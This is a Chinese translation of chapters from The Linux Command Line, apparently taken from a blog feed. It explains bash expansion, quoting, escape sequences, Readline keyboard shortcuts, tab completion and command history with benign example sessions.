<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo Five divided by two equals $((5/2))</span><br><span class="line">Five divided by two equals 2</span><br><span class="line">[me@linuxbox ~]$ echo with $((5%2)) left over.</span><br><span class="line">with 1 left over.</span><br></pre></td></tr></table></figure>

<p>算术展开在第34章中有更详细的介绍。</p>
<h4 id="大括号展开"><a href="#大括号展开" class="headerlink" title="大括号展开"></a>大括号展开</h4><p>也许最奇特的展开称为<em>大括号展开</em>。使用它，我们可以从包含大括号的模式中创建多个文本字符串。以下是一个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo Front-&#123;A,B,C&#125;-Back</span><br><span class="line">Front-A-Back Front-B-Back Front-C-Back</span><br></pre></td></tr></table></figure>

<p>要进行大括号展开的模式可能包含一个称为<em>preamble</em>的前导部分和一个称为<em>postscript</em>的后置部分。大括号表达式本身可以包含一个由逗号分隔的字符串列表或一个整数或单个字符的范围。该模式可能不包含未引用的空格。以下是使用整数范围的一个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo Number_&#123;1..5&#125;</span><br><span class="line">Number_1 Number_2 Number_3 Number_4 Number_5</span><br></pre></td></tr></table></figure>

<p>在bash 4.0及更高版本中，整数也可以进行<em>零填充</em>，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo &#123;01..15&#125;</span><br><span class="line">01 02 03 04 05 06 07 08 09 10 11 12 13 14 15</span><br><span class="line">[me@linuxbox ~]$ echo &#123;001..15&#125;</span><br><span class="line">001 002 003 004 005 006 007 008 009 010 011 012 013 014 015</span><br></pre></td></tr></table></figure>

<p>这里是一个反向顺序的字母范围：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo &#123;Z..A&#125;</span><br><span class="line">Z Y X W V U T S R Q P O N M L K J I H G F E D C B A</span><br></pre></td></tr></table></figure>

<p>大括号展开可以嵌套。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo a&#123;A&#123;1,2&#125;,B&#123;3,4&#125;&#125;b</span><br><span class="line">aA1b aA2b aB3b aB4b</span><br></pre></td></tr></table></figure>

<p>那么，这有什么好处呢？最常见的应用是创建文件或目录的列表。例如，如果我们是摄影师，并且有大量的图像收藏需要按年份和月份进行组织，我们可能首先要做的是创建一系列按数字“年-月”格式命名的目录。这样，目录名称将按时间顺序排序。我们可以手动输入完整的目录列表，但那是很多工作，而且容易出错。相反，我们可以这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ mkdir Photos</span><br><span class="line">[me@linuxbox ~]$ cd Photos</span><br><span class="line">[me@linuxbox Photos]$ mkdir &#123;2007..2009&#125;-&#123;01..12&#125;</span><br><span class="line">[me@linuxbox Photos]$ ls</span><br><span class="line">2007-01 2007-07 2008-01 2008-07 2009-01 2009-07</span><br><span class="line">2007-02 2007-08 2008-02 2008-08 2009-02 2009-08</span><br><span class="line">2007-03 2007-09 2008-03 2008-09 2009-03 2009-09</span><br><span class="line">2007-04 2007-10 2008-04 2008-10 2009-04 2009-10</span><br><span class="line">2007-05 2007-11 2008-05 2008-11 2009-05 2009-11</span><br><span class="line">2007-06 2007-12 2008-06 2008-12 2009-06 2009-12</span><br></pre></td></tr></table></figure>

<p>非常巧妙！</p>
<h4 id="参数展开"><a href="#参数展开" class="headerlink" title="参数展开"></a>参数展开</h4><p>在本章中，我们只会简要涉及参数展开，但稍后我们将进行深入的探讨。这是一个在shell脚本中比直接在命令行中更有用的特性。其许多功能与系统存储小数据块并为每个块命名有关。许多这样的块，更适当地称为<em>变量</em>，都可以供我们检查。例如，名为USER的变量包含我们的用户名。要调用参数展开并显示USER的内容，我们会这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo $USER</span><br><span class="line">me</span><br></pre></td></tr></table></figure>

<p>要查看可用变量的列表，请尝试以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ printenv | less</span><br></pre></td></tr></table></figure>

<p>你可能已经注意到，在使用其他类型的扩展时，如果我们拼写错误的模式，扩展将不会发生，echo命令将只是显示错误拼写的模式。但是，对于参数扩展，如果我们拼写变量名错误，扩展仍然会发生，但结果将为空字符串：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo $SUER</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<h4 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h4><p>命令替换允许我们使用命令的输出作为一个扩展。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo $(ls)</span><br><span class="line">Desktop Documents ls-output.txt Music Pictures Public Templates</span><br><span class="line">Videos</span><br></pre></td></tr></table></figure>

<p>其中一个我最喜欢的示例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l $(which cp)</span><br><span class="line">-rwxr-xr-x 1 root root 71516 2007-12-05 08:58 /bin/cp</span><br></pre></td></tr></table></figure>

<p>在这里，我们将which cp的结果作为ls命令的参数传递，从而获得了cp程序的列表，而无需知道其完整的路径名。我们不仅限于使用简单的命令。整个管道也可以用作替换的一部分（这里仅显示了部分输出）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ file $(ls -d /usr/bin/* | grep zip)</span><br><span class="line">/usr/bin/bunzip2: symbolic link to `bzip2&#x27;</span><br><span class="line">/usr/bin/bzip2: ELF 32-bit LSB executable, Intel 80386,</span><br><span class="line">version 1 (SYSV), dynamically linked (uses shared libs), for</span><br><span class="line">GNU/Linux 2.6.9, stripped</span><br><span class="line">/usr/bin/bzip2recover: ELF 32-bit LSB executable, Intel 80386,</span><br><span class="line">version 1 (SYSV), dynamically linked (uses shared libs), for</span><br><span class="line">GNU/Linux 2.6.9, stripped</span><br><span class="line">/usr/bin/funzip: ELF 32-bit LSB executable, Intel 80386,</span><br><span class="line">version 1 (SYSV), dynamically linked (uses shared libs), for</span><br><span class="line">GNU/Linux 2.6.9, stripped</span><br><span class="line">/usr/bin/gpg-zip: Bourne shell script text executable</span><br><span class="line">/usr/bin/gunzip: symbolic link to `../../bin/gunzip&#x27;</span><br><span class="line">/usr/bin/gzip: symbolic link to `../../bin/gzip&#x27;</span><br><span class="line">/usr/bin/mzip: symbolic link to `mtools&#x27;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，管道的结果成为file命令的参数列表。</p>
<p>在旧的shell程序中，命令替换还有另一种支持的语法，它使用<em>反引号</em>而不是美元符号和括号。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l `which cp`</span><br><span class="line">-rwxr-xr-x 1 root root 71516 2007-12-05 08:58 /bin/cp</span><br></pre></td></tr></table></figure>

<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>既然我们已经看到shell可以执行多种扩展的方式，现在是时候学习如何控制它了。例如，考虑以下情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo this is a test</span><br><span class="line">this is a test</span><br></pre></td></tr></table></figure>

<p>或者是这个：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo The total is $100.00</span><br><span class="line">The total is 00.00</span><br></pre></td></tr></table></figure>

<p>在第一个示例中，shell进行了<em>单词分割</em>，从echo命令的参数列表中去除了额外的空格。在第二个示例中，参数扩展为$1的值替换了一个空字符串，因为它是一个未定义的变量。shell提供了一种被称为<em>引用</em>的机制，可以选择性地抑制不需要的扩展。</p>
<h4 id="双引号"><a href="#双引号" class="headerlink" title="双引号"></a>双引号</h4><p>我们首先要看的引用类型是<em>双引号</em>。如果我们将文本放在双引号内，shell使用的所有特殊字符都失去了它们的特殊含义，并被视为普通字符。例外情况是$、\（反斜杠）和`（反引号）。这意味着单词分割、路径名扩展、波浪线扩展和大括号扩展都被抑制了，但参数扩展、算术扩展和命令替换仍然会执行。使用双引号，我们可以处理包含嵌入空格的文件名。假设我们不幸地成为一个名为two words.txt的文件的受害者。如果我们试图在命令行上使用它，单词分割会导致它被视为两个单独的参数，而不是所需的单一参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l two words.txt</span><br><span class="line">ls: cannot access two: No such file or directory</span><br><span class="line">ls: cannot access words.txt: No such file or directory</span><br></pre></td></tr></table></figure>

<p>通过使用双引号，我们停止了单词分割并获得了所需的结果；更进一步，我们甚至可以修复这个损害。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l &quot;two words.txt&quot;</span><br><span class="line">-rw-rw-r-- 1 me me 18 2016-02-20 13:03 two words.txt</span><br><span class="line">[me@linuxbox ~]$ mv &quot;two words.txt&quot; two_words.txt</span><br></pre></td></tr></table></figure>

<p>这样！现在我们不必再不停地输入那些讨厌的双引号了。</p>
<p>请记住，参数扩展、算术扩展和命令替换在双引号内仍然会发生。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo &quot;$USER $((2+2)) $(cal)&quot;</span><br><span class="line">me 4 February 2019</span><br><span class="line">Su Mo Tu We Th Fr Sa</span><br><span class="line">                1  2</span><br><span class="line"> 3  4  5  6  7  8  9</span><br><span class="line">10 11 12 13 14 15 16</span><br><span class="line">17 18 19 20 21 22 23</span><br><span class="line">24 25 26 27 28 29</span><br></pre></td></tr></table></figure>

<p>我们应该花一点时间看看双引号对命令替换的影响。首先，让我们深入了解单词分割是如何工作的。在我们之前的示例中，我们看到单词分割似乎去除了我们文本中的额外空格。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo this is a test</span><br><span class="line">this is a test</span><br></pre></td></tr></table></figure>

<p>默认情况下，单词分割查找空格、制表符和换行符（换行字符）并将它们视为单词之间的<em>分隔符</em>。这意味着未加引号的空格、制表符和换行符不被认为是文本的一部分。它们只是作为分隔符。因为它们将单词分隔为不同的参数，所以我们的示例命令行包含一个命令后面跟着四个不同的参数。如果我们添加双引号：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo &quot;this is a test&quot;</span><br><span class="line">this is a test</span><br></pre></td></tr></table></figure>

<p>单词分割被抑制，嵌入的空格不被视为分隔符；相反，它们成为参数的一部分。一旦添加了双引号，我们的命令行包含一个命令后面跟着一个参数。</p>
<p>单词分割机制将换行符视为分隔符的事实，对命令替换产生了一个有趣但微妙的影响。考虑以下情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo $(cal)</span><br><span class="line">February 2019 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 14</span><br><span class="line">15 16 17 18 19 20 21 22 23 24 25 26 27 28 29</span><br><span class="line">[me@linuxbox ~]$ echo &quot;$(cal)&quot;</span><br><span class="line"> February 2019</span><br><span class="line">Su Mo Tu We Th Fr Sa</span><br><span class="line">                1  2</span><br><span class="line"> 3  4  5  6  7  8  9</span><br><span class="line">10 11 12 13 14 15 16</span><br><span class="line">17 18 19 20 21 22 23</span><br><span class="line">24 25 26 27 28 29</span><br></pre></td></tr></table></figure>

<p>在第一个实例中，未加引号的命令替换导致命令行包含38个参数。在第二个实例中，它导致了一个包含嵌入空格和换行符的参数。</p>
<h4 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h4><p>如果我们需要抑制<em>所有</em>扩展，我们使用<em>单引号</em>。以下是未引用、双引号和单引号的比较：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo text ~/*.txt &#123;a,b&#125; $(echo foo) $((2+2)) $USER</span><br><span class="line">text /home/me/ls-output.txt a b foo 4 me</span><br><span class="line">[me@linuxbox ~]$ echo &quot;text ~/*.txt &#123;a,b&#125; $(echo foo) $((2+2)) $USER&quot;</span><br><span class="line">text ~/*.txt &#123;a,b&#125; foo 4 me</span><br><span class="line">[me@linuxbox ~]$ echo &#x27;text ~/*.txt &#123;a,b&#125; $(echo foo) $((2+2)) $USER&#x27;</span><br><span class="line">text ~/*.txt &#123;a,b&#125; $(echo foo) $((2+2)) $USER</span><br></pre></td></tr></table></figure>

<p>正如我们所看到的，每个连续的引用级别，越来越多的扩展被抑制。</p>
<h4 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h4><p>有时我们只想引用一个单一字符。为此，我们可以在字符前面加上反斜杠，这在此上下文中被称为<em>转义字符</em>。通常，这是在双引号内部选择性地防止扩展。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo &quot;The balance for user $USER is: \$5.00&quot;</span><br><span class="line">The balance for user me is: $5.00</span><br></pre></td></tr></table></figure>

<p>在文件名中，使用转义来消除字符的特殊含义也很常见。例如，可以在文件名中使用通常对shell具有特殊含义的字符。这些包括$、!、&amp;、空格和其他字符。要在文件名中包含特殊字符，我们可以这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ mv bad\&amp;filename good_filename</span><br></pre></td></tr></table></figure>

<p>为了允许反斜杠字符出现，通过键入\进行转义。请注意，在单引号内部，</p>
<p>反斜杠失去了其特殊含义，被视为普通字符。</p>
<p><strong>反斜杠转义序列</strong>除了作为转义字符的角色外，反斜杠还被用作表示某些特殊字符的记号的一部分，称为<em>控制代码</em>。ASCII编码方案中的前32个字符用于向类似电传打字机的设备传输命令。其中一些代码很熟悉（如制表符、退格、换行和回车），而其他一些则不是（如空、传输结束和确认）。</p>
<table>
<thead>
<tr>
<th><strong>转义序列</strong></th>
<th><strong>意义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>\a</td>
<td>铃声（导致计算机响铃的警报）</td>
</tr>
<tr>
<td>\b</td>
<td>退格</td>
</tr>
<tr>
<td>\n</td>
<td>换行。在类Unix系统上，这会产生一个换行符。</td>
</tr>
<tr>
<td>\r</td>
<td>回车</td>
</tr>
<tr>
<td>\t</td>
<td>制表符</td>
</tr>
</tbody></table>
<p>上表列出了一些常见的反斜杠转义序列。使用反斜杠的这种表示法起源于C编程语言，并已被许多其他语言，包括shell，所采纳。通过向echo添加-e选项，可以启用转义序列的解释。您也可以将它们放在<code>$&#39; &#39;中。在这里，使用sleep命令，这是一个简单的程序，只需等待指定的秒数然后退出，我们可以创建一个简单的倒计时计时器： **sleep 10; echo -e &quot;Time&#39;s up\a&quot;** 我们也可以这样做： **sleep 10; echo &quot;Time&#39;s up&quot; $</code>‘\a’**</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>随着我们在使用shell方面的深入，我们会发现扩展和引用的使用频率越来越高，因此了解它们的工作方式是有意义的。实际上，可以说它们是学习shell的最重要主题。如果没有对扩展有适当的理解，shell将始终是一个神秘和混乱的源头，其潜在的强大功能将被浪费。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li>bash手册页在扩展和引用上都有主要部分，以更正式的方式涵盖了这些主题。</li>
<li><em>Bash参考手册</em>也包含关于扩展和引用的章节：<span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2Jhc2gvbWFudWFsL2Jhc2hyZWYuaHRtbA==">http://www.gnu.org/software/bash/manual/bashref.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>高级键盘技巧</title>
    <url>/2024/03/8-advanced-keyboard-tricks/</url>
    <content><![CDATA[<h2 id="8-–-高级键盘技巧"><a href="#8-–-高级键盘技巧" class="headerlink" title="8 – 高级键盘技巧"></a>8 – 高级键盘技巧</h2><p>我经常开玩笑地说Unix是“喜欢打字的人的操作系统”。当然，它甚至有命令行也证明了这一点。但是，命令行用户并不希望打太多字。否则，为什么会有那么多命令的名称如此简短，例如cp、ls、mv和rm呢？事实上，命令行最珍贵的目标之一就是懒惰；用最少的按键做最多的工作。另一个目标是从不需要从键盘上抬起手指并去鼠标上点击。在这一章中，我们将探讨使键盘使用更快、更高效的bash特性。</p>
<span id="more"></span>

<p>以下命令将出现：</p>
<ul>
<li>clear – 清除屏幕内容</li>
<li>history – 显示历史命令列表的内容</li>
</ul>
<h3 id="命令行编辑"><a href="#命令行编辑" class="headerlink" title="命令行编辑"></a>命令行编辑</h3><p>bash使用一个名为<em>Readline</em>的库（一个可以被不同程序使用的共享程序集）来实现命令行编辑。我们已经见过其中的一些。例如，我们知道箭头键可以移动光标，但还有许多其他功能。可以将这些视为我们工作中可以使用的额外工具。并不是必须要学习所有的，但其中很多确实非常有用。根据需要进行选择和使用。</p>
<p>**注意：**以下一些键序列（特别是使用Alt键的）可能被GUI用于其他功能所拦截。在使用虚拟控制台时，所有的键序列应该可以正确工作。</p>
<h4 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h4><p>以下表格列出了用于移动光标的键：</p>
<p><em>表8-1：光标移动命令</em></p>
<table>
<thead>
<tr>
<th><strong>键</strong></th>
<th><strong>操作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl-a</td>
<td>将光标移动到行的开头。</td>
</tr>
<tr>
<td>Ctrl-e</td>
<td>将光标移动到行的末尾。</td>
</tr>
<tr>
<td>Ctrl-f</td>
<td>向前移动一个字符的位置；与右箭头键相同。</td>
</tr>
<tr>
<td>Ctrl-b</td>
<td>向后移动一个字符的位置；与左箭头键相同。</td>
</tr>
<tr>
<td>Alt-f</td>
<td>向前移动一个单词的位置。</td>
</tr>
<tr>
<td>Alt-b</td>
<td>向后移动一个单词的位置。</td>
</tr>
<tr>
<td>Ctrl-l</td>
<td>清除屏幕并将光标移动到左上角。与clear命令执行相同的操作。</td>
</tr>
</tbody></table>
<h4 id="修改文本"><a href="#修改文本" class="headerlink" title="修改文本"></a>修改文本</h4><p>由于在组合命令时可能会犯错误，因此我们需要一种有效地进行更正的方法。表8-2描述了用于编辑命令行上字符的键盘命令。</p>
<p><em>表8-2：文本编辑命令</em></p>
<table>
<thead>
<tr>
<th><strong>键</strong></th>
<th><strong>操作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl-d</td>
<td>删除光标位置的字符。</td>
</tr>
<tr>
<td>Ctrl-t</td>
<td>交换光标位置的字符与其前面的字符。</td>
</tr>
<tr>
<td>Alt-t</td>
<td>交换光标位置的单词与其前面的单词。</td>
</tr>
<tr>
<td>Alt-l</td>
<td>将光标位置到单词末尾的字符转换为小写。</td>
</tr>
<tr>
<td>Alt-u</td>
<td>将光标位置到单词末尾的字符转换为大写。</td>
</tr>
</tbody></table>
<h4 id="剪切和粘贴（杀死和插入）文本"><a href="#剪切和粘贴（杀死和插入）文本" class="headerlink" title="剪切和粘贴（杀死和插入）文本"></a>剪切和粘贴（杀死和插入）文本</h4><p>Readline文档使用“killing”和“yanking”这些术语来指代我们通常所说的剪切和粘贴。被剪切的项目存储在一个缓冲区（内存中的临时存储区域）中，称为<em>kill-ring</em>。</p>
<p>命令行编辑</p>
<p><em>表8-3：剪切和粘贴命令</em></p>
<table>
<thead>
<tr>
<th><strong>键</strong></th>
<th><strong>操作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl-k</td>
<td>从光标位置剪切到行末。</td>
</tr>
<tr>
<td>Ctrl-u</td>
<td>从光标位置剪切到行开头。</td>
</tr>
<tr>
<td>Alt-d</td>
<td>从光标位置剪切到当前单词末尾。</td>
</tr>
<tr>
<td>Alt-Backspace</td>
<td>从光标位置剪切到当前单词的开头。如果光标位于单词的开头，则剪切前一个单词。</td>
</tr>
<tr>
<td>Ctrl-y</td>
<td>从kill-ring中粘贴文本并在光标位置插入。</td>
</tr>
</tbody></table>
<h3 id="Meta键"><a href="#Meta键" class="headerlink" title="Meta键"></a>Meta键</h3><p>如果你深入阅读Readline文档，可以在bash手册页的“READLINE”部分找到，你会遇到<em>meta键</em>这个术语。在现代键盘上，这对应于Alt键，但这并不总是这样。</p>
<p>在遥远的时代（在PC之前但在Unix之后），并不是每个人都有自己的计算机。他们可能拥有的是一个被称为<em>终端</em>的设备。终端是一个通信设备，它配备了一个文本显示屏和一个键盘，内部只有足够的电子元件来显示文本字符并移动光标。它通过串行电缆（通常）连接到更大的计算机或更大计算机的通信网络上。有许多不同品牌的终端，它们都有不同的键盘和显示特性。由于它们都至少能理解ASCII，因此希望编写可移植应用程序的软件开发者会针对最低公共分母进行编写。Unix系统有一套复杂的方法来处理终端及其不同的显示特性。由于Readline的开发者不能确定是否存在一个专用的额外控制键，他们发明了一个并称之为<em>meta</em>。在现代键盘上，Alt键作为meta键，但如果你仍在使用终端（在Linux中你仍然可以这样做），你也可以按下并释放Esc键以获得按住Alt键时的相同效果。</p>
<h3 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h3><p>外壳另一种帮助我们的方式是通过一种称为<em>自动补全</em>的机制。当我们在输入命令时按下tab键时，就会发生自动补全。让我们看看这是如何工作的。假设有一个如下所示的家目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls</span><br><span class="line">Desktop ls-output.txt Pictures Templates Videos</span><br><span class="line">Documents Music Public</span><br></pre></td></tr></table></figure>

<p>试着输入以下内容，但<strong>不要按下</strong> <strong>Enter键</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls l</span><br></pre></td></tr></table></figure>

<p>现在按下Tab键。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls ls-output.txt</span><br></pre></td></tr></table></figure>

<p>看到了吗？shell为我们完成了这行内容。让我们再试一个。同样，不要按Enter。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls D</span><br></pre></td></tr></table></figure>

<p>按下Tab。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls D</span><br></pre></td></tr></table></figure>

<p>没有完成，什么都没有。这是因为D匹配了目录中的多个条目。为了使自动补全成功，我们给它的“线索”必须是明确的。如果我们像下面这样继续：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls Do</span><br></pre></td></tr></table></figure>

<p>然后按Tab：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls Documents</span><br></pre></td></tr></table></figure>

<p>自动补全是成功的。</p>
<p>虽然这个示例展示了路径名的自动补全，这是它最常见的用法，但自动补全也可以用于变量（如果单词的开头是$）、用户名（如果单词以~开头）、命令（如果单词是行上的第一个单词）和主机名（如果单词的开头是@）。主机名的自动补全只对列在&#x2F;etc&#x2F;hosts中的主机名有效。</p>
<p>与自动补全相关的有许多控制和meta键序列，如表8-4所列。</p>
<p><em>表8-4：自动补全命令</em></p>
<table>
<thead>
<tr>
<th><strong>键</strong></th>
<th><strong>操作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Alt-?</td>
<td>显示可能的自动补全列表。<em>在大多数系统上，你还可以通过再次按</em> Tab <em>键来执行此操作，这样做更容易。</em></td>
</tr>
<tr>
<td>Alt-*</td>
<td>插入所有可能的自动补全。当你想使用多个可能的匹配项时，这是很有用的。</td>
</tr>
</tbody></table>
<p>还有一些相当晦涩的键和操作。在bash手册的“READLINE”部分中有一个列表。</p>
<p><strong>可编程自动补全</strong>最近版本的bash具有一个称为<em>可编程自动补全</em>的功能。可编程自动补全允许你（或更可能是你的发行版提供者）添加额外的补全规则。通常，这是为了支持特定的应用程序。例如，可以为命令的选项列表添加补全，或者匹配应用程序支持的特定文件类型。Ubuntu默认定义了一个相当大的集合。可编程自动补全是通过shell函数来实现的，这是一种我们将在后面章节中介绍的小型shell脚本。如果你好奇，试试以下命令：<strong>set | less</strong>，看看你能否找到它们。并不是所有的发行版都默认包含它们。</p>
<h3 id="使用历史记录"><a href="#使用历史记录" class="headerlink" title="使用历史记录"></a>使用历史记录</h3><p>正如我们在第1章中发现的那样，bash会维护已输入的命令的历史记录。这些命令的列表存储在我们的家目录中的一个名为.bash_history的文件中。结合命令行编辑，历史记录功能是减少我们需要输入的内容的有用资源。</p>
<h4 id="搜索历史记录"><a href="#搜索历史记录" class="headerlink" title="搜索历史记录"></a>搜索历史记录</h4><p>随时，我们都可以通过执行以下操作来查看历史列表的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ history | less</span><br></pre></td></tr></table></figure>

<p>默认情况下，bash 存储我们输入的最后 500 个命令，尽管大多数现代发行版将此值设置为 1000。我们将在第 11 章中了解如何调整此值。假设我们想要查找用于列出 &#x2F;usr&#x2F;bin 的命令。这是我们可以这样做的一种方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ history | grep /usr/bin</span><br></pre></td></tr></table></figure>

<p>假设在我们的结果中，我们得到了一行包含一个有趣命令的行，如下：</p>
<blockquote>
<p>88 ls -l &#x2F;usr&#x2F;bin &gt; ls-output.txt</p>
</blockquote>
<p>88 是历史列表中命令的行号。我们可以使用另一种称为 <em>history expansion</em> 的扩展来立即使用这个命令。为了使用我们发现的行，我们可以这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ !88</span><br></pre></td></tr></table></figure>

<p>bash 将 !88 扩展为历史列表中第 88 行的内容。在下一节中，我们将介绍其他形式的历史扩展。</p>
<p>bash 还提供了逐步搜索历史列表的能力。这意味着我们可以告诉 bash 在我们输入字符时搜索历史列表，每增加一个字符，我们的搜索就会进一步细化。要开始逐步搜索，按下 Ctrl-r，然后输入我们正在查找的文本。当我们找到它时，我们可以按 Enter 执行该命令，或者按 Ctrl-j 将该行从历史列表复制到当前命令行。要查找文本的下一个出现（向“上”移动历史列表），再次按下 Ctrl-r。要退出搜索，请按 Ctrl-g 或 Ctrl-c。这里我们看到它在实际操作中：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>首先按下 Ctrl-r。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(reverse-i-search)`&#x27;: </span><br></pre></td></tr></table></figure>

<p>提示符会更改以指示我们正在执行反向逐步搜索。这是“反向”的，因为我们从“现在”搜索到过去的某个时间。接下来，我们开始输入搜索文本。在这个例子中，是 &#x2F;usr&#x2F;bin：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(reverse-i-search)`/usr/bin&#x27;: ls -l /usr/bin &gt; ls-output.txt</span><br></pre></td></tr></table></figure>

<p>立即，搜索返回我们的结果。有了结果，我们可以按 Enter 执行该命令，或者按 Ctrl-j 将命令复制到当前命令行进行进一步编辑。让我们复制它。按 Ctrl-j。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /usr/bin &gt; ls-output.txt</span><br></pre></td></tr></table></figure>

<p>我们的 shell 提示符返回，并且我们的命令行已加载并准备好进行操作！</p>
<p>表 8-5 列出了用于操作历史列表的一些按键。</p>
<p><em>表 8-5：历史命令</em></p>
<table>
<thead>
<tr>
<th><strong>按键</strong></th>
<th><strong>动作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl-p</td>
<td>移动到前一个历史条目。这与上箭头的动作相同。</td>
</tr>
<tr>
<td>Ctrl-n</td>
<td>移动到下一个历史条目。这与下箭头的动作相同。</td>
</tr>
<tr>
<td>Alt-&lt;</td>
<td>移动到历史列表的开始（顶部）。</td>
</tr>
<tr>
<td>Alt-&gt;</td>
<td>移动到历史列表的结束（底部），即当前命令行。</td>
</tr>
<tr>
<td>Ctrl-r</td>
<td>反向逐步搜索。这会从当前命令行开始，逐步搜索历史列表。</td>
</tr>
<tr>
<td>Alt-p</td>
<td>反向搜索，非逐步。使用此键，输入搜索字符串并在执行搜索之前按 Enter。</td>
</tr>
<tr>
<td>Alt-n</td>
<td>前向搜索，非逐步。</td>
</tr>
<tr>
<td>Ctrl-o</td>
<td>执行历史列表中的当前项目并前进到下一个。如果我们试图重新执行历史列表中的一系列命令，这非常方便。</td>
</tr>
</tbody></table>
<h4 id="历史扩展"><a href="#历史扩展" class="headerlink" title="历史扩展"></a>历史扩展</h4><p>shell 使用 ! 字符为历史列表中的项目提供了一种特殊类型的扩展。我们已经看到感叹号后面可以跟一个数字来插入历史列表中的一个条目。如表 8-6 中所描述，还有许多其他的扩展特性。</p>
<p><em>表 8-6：历史扩展命令</em></p>
<table>
<thead>
<tr>
<th><strong>序列</strong></th>
<th><strong>动作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>!!</td>
<td>重复上一条命令。按上箭头然后按 Enter 可能更容易。</td>
</tr>
<tr>
<td>!<em>数字</em></td>
<td>重复历史列表中的第 <em>数字</em> 条目。</td>
</tr>
<tr>
<td>!字符串</td>
<td>重复以字符串开始的最后一个历史列表项。</td>
</tr>
<tr>
<td>!?字符串</td>
<td>重复包含字符串的最后一个历史列表项。</td>
</tr>
</tbody></table>
<p>我建议在使用 !字符串 和 !?字符串 形式时要小心，除非您绝对确定历史列表项的内容。</p>
